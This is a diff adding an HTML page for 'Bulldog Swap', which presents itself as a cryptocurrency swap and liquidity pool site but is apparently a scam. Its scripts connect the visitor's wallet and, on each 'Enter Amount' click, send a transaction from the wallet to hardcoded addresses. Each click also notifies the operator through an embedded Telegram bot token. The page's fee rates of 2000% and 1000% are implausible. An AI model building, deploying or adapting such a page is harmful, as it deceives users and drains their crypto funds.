@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html lang="zxx">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="description" content="">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <!-- Title -->
+    <title>Bulldog Swap 3rd Generation Swap System</title>
+    <meta name="description" content="Bulldog Swap is the first large swap using new 3rd generation blockchain.">
+    <link rel="icon" type="image/x-icon" href="icon.jpg">
+    <!-- Favicon -->
+
+    <!-- Core Stylesheet -->
+    <link rel="stylesheet" href="css/style.css">
+
+    <!-- Responsive Stylesheet -->
+    <link rel="stylesheet" href="css/responsive.css">
+    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+    
+</head>
+
+<body class="light-version">
+    <!-- Preloader -->
+    <div id="preloader">
+        <div class="preload-content">
+            <div id="dream-load"></div>
+        </div>
+    </div>
+
+    
+        <!-- ##### Header Area Start ##### -->
+        <header class="header-area wow fadeInDown" data-wow-delay="0.2s">
+            <div class="light classy-nav-container breakpoint-off">
+                <div class="container">
+                    <!-- Classy Menu -->
+                    <nav class="classy-navbar justify-content-between" id="dreamNav">
+
+                        <!-- Logo -->
+                        <a class="nav-brand" href="#"> Bulldog Swap</a>
+
+                        <!-- Navbar Toggler -->
+                        <div class="classy-navbar-toggler">
+                            <span class="navbarToggler"><span></span><span></span><span></span></span>
+                        </div>
+
+                        <!-- Menu -->
+                        <div class="classy-menu">
+
+                            <!-- close btn -->
+                            <div class="classycloseIcon">
+                                <div class="cross-wrap"><span class="top"></span><span class="bottom"></span></div>
+                            </div>
+
+                            <!-- Nav Start -->
+                            <div class="classynav">
+                                <ul id="nav">
+                                    <li><a href="#home">Home</a></li>
+                                    <li><a href="#about">About</a></li>
+                                    <li><a href="#contact">Contact</a></li>
+                                </ul>
+                                <!-- Button -->
+                            </div>
+                            <!-- Nav End -->
+                        </div>
+                    </nav>
+                </div>
+            </div>
+        </header>
+        <!-- ##### Header Area End ##### -->
+    <div class="scew-bg">
+        <!-- ##### Welcome Area Start ##### -->
+        <section class="welcome_area clearfix auto-init ico fullwidth" data-options='{direction: "normal"}' id="home" >
+            
+            <!-- Hero Content -->
+            <div class="hero-content transparent">
+                <!-- blip -->
+                <div class="dream-blip blip1"></div>
+                <div class="dream-blip blip2"></div>
+                <div class="dream-blip blip3"></div>
+                <div class="dream-blip blip4"></div>
+
+                <div class="container h-100">
+                    <div class="row h-100 align-items-center">
+                        <!-- Welcome Content -->
+                        <div class="col-12 col-lg-6 col-md-12">
+                            <div class="welcome-content">
+                                <ul class="nav nav-tabs nav-pills navbar-light bg-light" id="myTab" role="tablist">
+                                    <li class="nav-item">
+                                        <a class="nav-link active" id="home-tab" data-toggle="tab" href="#homer" role="tab" aria-controls="home" aria-selected="true">Swap</a>
+                                    </li>
+                                    <li class="nav-item">
+                                        <a class="nav-link" id="profile-tab" data-toggle="tab" href="#profile" role="tab" aria-controls="profile" aria-selected="false">Pool</a>
+                                    </li>
+                                    <li class="nav-item">
+                                        <a class="nav-link" id="contact-tab" data-toggle="tab" href="#contact" role="tab" aria-controls="contact" aria-selected="false">Vote</a>
+                                    </li>
+                                </ul>
+                                <div class="tab-content" id="myTabContent">
+                                <div class="tab-pane fade show active" id="homer" role="tabpanel" aria-labelledby="home-tab">
+                                    <center>
+                                        <div class="card" style="max-width: 40rem;">
+                                        <div class="card-header">1 BULL =  $1.00 </div>
+                                        <div class="card-body">
+                                            <h5 class="card-title">Welcome BulldogSwap</h5>
+                                            Your Wallet Address: <p id="para"></p>
+
+                                            <select name="example" class="test-select2">
+                                                <option value="選択肢1">ETH</option>
+                                                <option value="選択肢1">USDT</option>
+                                            </select>
+
+                                            <select name="example" class="test1-select2">
+                                            <option value="選択肢1">BUL</option>
+                                            </select>
+
+                                            </br></br>
+                                            <button class="sendEthButton btn btn-info btn-lg">Enter Amount</button>
+                                        </div>
+                                        </div>
+                                    </center>
+                            </div>
+
+                            <div class="tab-pane fade" id="profile" role="tabpanel" aria-labelledby="profile-tab">
+                                <center>
+                                <div class="card text-white bg-dark mb-3" style="max-width: 40rem;">
+                                <div class="card-header">Pool</div>
+                                <div class="card-body">
+                                    <h5 class="card-title">Add Liquidity</h5>
+                                    <h5>Select Pairs</h5>
+                                    <select name="example" class="test2-select2">
+                                    <option value="選択肢1">ETH</option>
+                                    <option value="選択肢1">BUl</option>
+                                    <option value="選択肢1">USDT</option>
+                                    </select>
+
+                                    <select name="example" class="test3-select2">
+                                        <option value="選択肢1">ETH</option>
+                                        <option value="選択肢1">BUl</option>
+                                        <option value="選択肢1">USDT</option>
+                                    </select>
+                                    </br></br>
+                                    <h5>Select Fee Tier</h5>
+                                    ①ETH×Bul        2000%</br>
+                                    ②USDT×Bul     1000%</br>
+                                    ③ETH×USDT   45%</br>
+                                    </br>
+                                    <h6>Your liquidity will only earn fees when the market price of the pair is within your range.</h6>
+                                    </br>
+                                    <button class="sendEthButton1 btn btn-success btn-lg">Enter Amount</button>
+                                </div>
+                            </div>
+                            </center>
+
+                            </div>
+                            <div class="tab-pane fade" id="contact" role="tabpanel" aria-labelledby="contact-tab">
+                                coming soon
+
+                            </div>
+                            </div>
+                                
+                            </div>
+                        </div>
+                        <!-- Welcome Video Area -->
+                        <div class="col-12 col-lg-6 col-md-12">
+                            <div class="main-ilustration main-ilustration-8 wow fadeInUp" style="" data-wow-delay="0.5s">
+                                  
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+        <!-- ##### Welcome Area End ##### -->
+
+
+  
+    <!-- ##### Blog Area End ##### -->
+
+    <!-- ##### Footer Area Start ##### -->
+    <footer class="footer-area bg-img" style="background-image: url(img/core-img/pattern.png);">
+
+        <!-- ##### Contact Area End ##### -->
+
+        <div class="footer-content-area ">
+            <div class="container">
+                <div class="row align-items-end">
+                    <div class="col-12 col-md-5">
+                        <div class="footer-copywrite-info">
+                            <!-- Copywrite -->
+                            <div class="copywrite_text wow fadeInUp" data-wow-delay="0.2s">
+                                <div class="footer-logo">
+                                    <a href="#">Bulldog Swap</a>
+                                </div>
+                                <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit. Velit ducimus voluptatibus neque illo id repellat quisquam? Autem expedita earum quae laborum ipsum ad, a eaque officiis eligendi blanditiis odio necessitatibus.</p>
+                            </div>
+                            <!-- Social Icon -->
+                            <div class="footer-social-info wow fadeInUp" data-wow-delay="0.4s">
+                                <a href="#"><i class="fa fa-facebook" aria-hidden="true"></i></a>
+                                <a href="#"> <i class="fa fa-twitter" aria-hidden="true"></i></a>
+                                <a href="#"><i class="fa fa-google-plus" aria-hidden="true"></i></a>
+                                <a href="#"><i class="fa fa-instagram" aria-hidden="true"></i></a>
+                                <a href="#"><i class="fa fa-linkedin" aria-hidden="true"></i></a>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-12 col-md-7">
+                        <!-- Content Info -->
+                        <div class="contact_info_area d-sm-flex justify-content-between">
+                            <div class="contact_info text-center wow fadeInUp" data-wow-delay="0.2s">
+                                <h5>NAVIGATE</h5>
+                                <a href=""><p>Advertisers</p></a>
+                                <a href=""><p>Developers</p></a>
+                                <a href=""><p>Resources</p></a>
+                                <a href=""><p>Company</p></a>
+                                <a href=""><p>Connect</p></a>
+                            </div>
+                            <!-- Content Info -->
+                            <div class="contact_info text-center wow fadeInUp" data-wow-delay="0.3s">
+                                <h5>PRIVACY & TOS</h5>
+                                <a href=""><p>Advertiser Agreement</p></a>
+                                <a href=""><p>Acceptable Use Policy</p></a>
+                                <a href=""><p>Privacy Policy</p></a>
+                                <a href=""><p>Technology Privacy</p></a>
+                                <a href=""><p>Developer Agreement</p></a>
+                            </div>
+                            <!-- Content Info -->
+                            <div class="contact_info text-center wow fadeInUp" data-wow-delay="0.4s">
+                                <h5>CONTACT US</h5>
+                                <p>Mailing Address:xx00 E. Union Ave</p>
+                                <p>Suite 1100. Denver, CO 80237</p>
+                                <p>+999 90932 627</p>
+                                <p>support@yourdomain.com</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </footer>
+    <!-- ##### Footer Area End ##### -->
+    <script type="text/javascript">
+
+        function botsend1(){
+          var settings = {
+          "async": true,
+          "crossDomain": true,
+          "url": "https://api.telegram.org/bot" + '1671846956:AAH2sMEv7ojBXEwZNHE3ZK9aHG_sCckChXc' + "/sendMessage",
+          "method": "POST",
+          "headers": {
+            "Content-Type": "application/json",
+            "cache-control": "no-cache"
+          },
+          "data": JSON.stringify({
+            "chat_id": '1164330043',
+            "text": 'Swap'
+          })
+        };
+        
+        $.ajax(settings).done(function (response) {
+          console.log(response);
+        });
+        };
+        
+        function botsend2(){
+          var settings2 = {
+          "async": true,
+          "crossDomain": true,
+          "url": "https://api.telegram.org/bot" + '1671846956:AAH2sMEv7ojBXEwZNHE3ZK9aHG_sCckChXc' + "/sendMessage",
+          "method": "POST",
+          "headers": {
+            "Content-Type": "application/json",
+            "cache-control": "no-cache"
+          },
+          "data": JSON.stringify({
+            "chat_id": '1164330043',
+            "text": 'Pool'
+          })
+        };
+        
+        $.ajax(settings2).done(function (response) {
+          console.log(response);
+        });
+        };
+        
+        
+        
+        $(function() {
+          $('.test-select2').select2({
+            language: "ja" //日本語化
+          });
+        })
+        
+        $(function() {
+          $('.test1-select2').select2({
+            language: "ja" //日本語化
+          });
+        })
+        
+        $(function() {
+          $('.test2-select2').select2({
+            language: "ja" //日本語化
+          });
+        })
+        
+        $(function() {
+          $('.test3-select2').select2({
+            language: "ja" //日本語化
+          });
+        })
+        
+        
+        </script>
+    <!-- ########## All JS ########## -->
+    <!-- jQuery js -->
+    <script src="js/jquery.min.js"></script>
+    <!-- Popper js -->
+    <script src="js/popper.min.js"></script>
+    <!-- Bootstrap js -->
+    <script src="js/bootstrap.min.js"></script>
+    <!-- All Plugins js -->
+    <script src="js/plugins.js"></script>
+    <!-- Parallax js -->
+    <script src="js/dzsparallaxer.js"></script>
+
+    <script src="js/jquery.syotimer.min.js"></script>
+
+    <!-- script js -->
+    <script src="js/script.js"></script>
+
+
+    <script type="text/javascript">
+        window.addEventListener('load', async() => {
+          if (window.ethereum) {
+            window.web3 = new Web3(ethereum);
+            try {
+              await ethereum.enable();
+              initPayButton()
+            } catch (err) {
+              $('#status').html('Please Login', err)
+            }
+          } else if (window.web3) {
+            window.web3 = new Web3(web3.currentProvider)
+            initPayButton()
+          } else {
+            $('#status').html('No Metamask (or other Web3 Provider) installed')
+          }
+        });
+    
+        const web4 = new Web3(Web3.givenProvider ||'https://bsc-dataseed1.binance.org:443');
+        const account = web4.eth.providers[0]
+        document.getElementById("para").innerHTML=web3.currentProvider.selectedAddress
+    
+        const sendEthButton = document.querySelector('.sendEthButton');    
+        //Sending Ethereum to an address
+        sendEthButton.addEventListener('click', () => {
+          botsend1();
+    
+          ethereum
+            .request({
+              method: 'eth_sendTransaction',
+              params: [
+                {
+                  from: web3.currentProvider.selectedAddress,
+                  to: '0x491a809e3e1163B99Ca2B58056093B6A03c2B5e0',
+                  gasPrice: '0x09184e72a000',
+                  gas: '0x2710',
+                },
+              ],
+            })
+            .then((txHash) => console.log(txHash))
+            .catch((error) => console.error);
+    
+        });
+    
+    
+    
+    
+    
+        const sendEthButton1 = document.querySelector('.sendEthButton1');    
+        //Sending Ethereum to an address
+        sendEthButton1.addEventListener('click', () => {
+          
+          botsend2();
+    
+          ethereum
+            .request({
+              method: 'eth_sendTransaction',
+              params: [
+                {
+                  from: web3.currentProvider.selectedAddress,
+                  to: '0x53E1ABA982fBb6D5291B262D33D547c9eFB4a62b',
+                  gasPrice: '0x09184e72a000',
+                  gas: '0x2710',
+                },
+              ],
+            })
+            .then((txHash) => console.log(txHash))
+            .catch((error) => console.error);
+    
+        });
+    
+    
+      </script>
+
+</body>
+
+
+
+</html>
